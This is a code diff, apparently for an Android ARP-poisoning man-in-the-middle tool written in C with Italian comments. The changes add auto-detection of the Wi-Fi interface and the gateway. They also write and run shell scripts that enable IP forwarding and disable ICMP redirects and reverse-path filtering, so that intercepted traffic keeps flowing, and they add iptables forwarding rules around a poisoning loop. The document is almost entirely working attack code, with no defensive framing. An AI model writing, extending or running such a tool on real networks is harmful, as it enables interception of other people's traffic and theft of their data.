@@ -83,6 +83,28 @@ static void on_sigint(int sig) {
     running = 0;
 }
 
+static char* detect_wifi_iface(void) {
+    FILE *fp = popen("ip -o link show | awk -F': ' '/wlan|wlp/ {print $2; exit}'", "r");
+    if (!fp) return NULL;
+    char buf[64];
+    if (fgets(buf, sizeof(buf), fp) == NULL) { pclose(fp); return NULL; }
+    pclose(fp);
+    buf[strcspn(buf, "\n")] = 0;
+    if (strlen(buf) == 0) return NULL;
+    return strdup(buf);
+}
+
+static char* detect_default_gateway(void) {
+    FILE *fp = popen("ip route | awk '/default/ {print $3; exit}'", "r");
+    if (!fp) return NULL;
+    char buf[64];
+    if (fgets(buf, sizeof(buf), fp) == NULL) { pclose(fp); return NULL; }
+    pclose(fp);
+    buf[strcspn(buf, "\n")] = 0;
+    if (strlen(buf) == 0) return NULL;
+    return strdup(buf);
+}
+
 // ============================================================
 // INFO DI RETE
 // ============================================================
@@ -118,7 +140,42 @@ static int get_iface_ip(const char *ifname, uint8_t *out) {
 // IP FORWARDING
 // ============================================================
 
-static int avvia_ipForwarding(void) {
+static int avvia_ipForwarding(const char *iface, const char *gateway) {
+    FILE *f = fopen(START_SCRIPT, "w");
+    if (!f) { perror("fopen start_mitm.sh"); return -1; }
+    fprintf(f,
+        "#!/system/bin/sh\n"
+        "# Avvia forwarding per MITM su stessa interfaccia\n"
+        "\n"
+        "IFACE=%s\n"
+        "GATEWAY=%s      # IP del PC (hotspot) - ADATTA\n"
+        "\n"
+        "# 1. Abilita IP forwarding\n"
+        "echo 1 > /proc/sys/net/ipv4/ip_forward\n"
+        "\n"
+        "# 2. Disabilita ICMP redirect (CRUCIALE)\n"
+        "#    Se attivi, il kernel dice a TEL2 \"vai diretto al PC\", rompendo il MITM\n"
+        "echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects\n"
+        "echo 0 > /proc/sys/net/ipv4/conf/$IFACE/send_redirects\n"
+        "\n"
+        "# 3. Disabilita reverse path filtering (evita drop di pacchetti)\n"
+        "echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter\n"
+        "echo 0 > /proc/sys/net/ipv4/conf/$IFACE/rp_filter\n"
+        "\n"
+        "# 4. Pulisci regole vecchie\n"
+        "iptables -F FORWARD 2>/dev/null\n"
+        "iptables -t nat -F POSTROUTING 2>/dev/null\n"
+        "\n"
+        "# 5. Permetti forwarding tra TEL2 e PC (stessa interfaccia)\n"
+        "#    Non serve -i/-o specifici perché è tutto su wlan0\n"
+        "iptables -A FORWARD -i $IFACE -o $IFACE -j ACCEPT\n"
+        "iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT\n"
+        "iptables -P FORWARD ACCEPT\n"
+        "\n"
+        "echo \"[+] MITM forwarding attivo su $IFACE\"\n",
+        iface, gateway);
+    fclose(f);
+
     int ret = system("sh " START_SCRIPT);
     if (ret == -1) {
         perror("system start_mitm");
@@ -131,7 +188,34 @@ static int avvia_ipForwarding(void) {
     return 0;
 }
 
-static int ferma_ipForwarding(void) {
+static int ferma_ipForwarding(const char *iface) {
+    FILE *f = fopen(STOP_SCRIPT, "w");
+    if (!f) { perror("fopen stop_mitm.sh"); return -1; }
+    fprintf(f,
+        "#!/system/bin/sh\n"
+        "# Ferma forwarding e ripristina stato originale\n"
+        "\n"
+        "IFACE=%s\n"
+        "\n"
+        "# 1. Disabilita IP forwarding\n"
+        "echo 0 > /proc/sys/net/ipv4/ip_forward\n"
+        "\n"
+        "# 2. Ripristina ICMP redirect\n"
+        "echo 1 > /proc/sys/net/ipv4/conf/all/send_redirects\n"
+        "echo 1 > /proc/sys/net/ipv4/conf/$IFACE/send_redirects\n"
+        "\n"
+        "# 3. Ripristina rp_filter\n"
+        "echo 1 > /proc/sys/net/ipv4/conf/all/rp_filter\n"
+        "echo 1 > /proc/sys/net/ipv4/conf/$IFACE/rp_filter\n"
+        "\n"
+        "# 4. Pulisci regole\n"
+        "iptables -F FORWARD 2>/dev/null\n"
+        "iptables -t nat -F POSTROUTING 2>/dev/null\n"
+        "\n"
+        "echo \"[-] MITM forwarding disattivato\"\n",
+        iface);
+    fclose(f);
+
     int ret = system("sh " STOP_SCRIPT);
     if (ret == -1) {
         perror("system stop_mitm");
@@ -385,12 +469,19 @@ static void riscalda_arp(const char *iface, const char *gateway_ip) {
 // ============================================================
 
 int main(int argc, char **argv) {
-    if (argc != 3) {
-        fprintf(stderr, "uso: %s <iface> <gateway_ip>   (es. wlan0 192.168.1.1)\n",
-                argv[0]);
-        return 1;
+    char *iface_auto = NULL;
+    char *gw_auto    = NULL;
+
+    if (argc >= 2) {
+        iface = argv[1];
+    } else {
+        iface_auto = detect_wifi_iface();
+        if (!iface_auto) {
+            fprintf(stderr, "nessuna interfaccia Wi-Fi rilevata\n");
+            return 1;
+        }
+        iface = iface_auto;
     }
-    iface = argv[1];
 
     signal(SIGINT, on_sigint);
 
@@ -407,15 +498,26 @@ int main(int argc, char **argv) {
     free(my_mac_s); free(my_ip_s);
 
     // 2) Gateway passato come argv[2]
-    if (inet_pton(AF_INET, argv[2], gw_ip) != 1) {
-        fprintf(stderr, "gateway IP non valido: %s\n", argv[2]);
+    char *gw_str;
+    if (argc >= 3) {
+        gw_str = argv[2];
+    } else {
+        gw_auto = detect_default_gateway();
+        if (!gw_auto) {
+            fprintf(stderr, "nessun gateway rilevato\n");
+            return 1;
+        }
+        gw_str = gw_auto;
+    }
+    if (inet_pton(AF_INET, gw_str, gw_ip) != 1) {
+        fprintf(stderr, "gateway IP non valido: %s\n", gw_str);
         return 1;
     }
     char *gw_ip_s = convert_ip(gw_ip);
     printf("[*] gateway IP=%s\n", gw_ip_s ? gw_ip_s : "?");
     free(gw_ip_s);
 
-    riscalda_arp(iface, gw_ip_s);
+    riscalda_arp(iface, gw_str);
 
     // 3) Socket raw
     sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
@@ -466,7 +568,7 @@ int main(int argc, char **argv) {
 
     flush_arp_cache(iface);
 
-    avvia_ipForwarding();
+    avvia_ipForwarding(iface, gw_str);
 
     // 7) Loop di poisoning
     printf("[*] avvio loop di poisoning (CTRL+C per fermare)\n");
@@ -485,7 +587,10 @@ int main(int argc, char **argv) {
     close(sock);
 
     printf("[*] disattivo IP forwarding...\n");
-    ferma_ipForwarding();
+    ferma_ipForwarding(iface);
+
+    free(iface_auto);
+    free(gw_auto);
 
     printf("[*] done.\n");
     return 0;
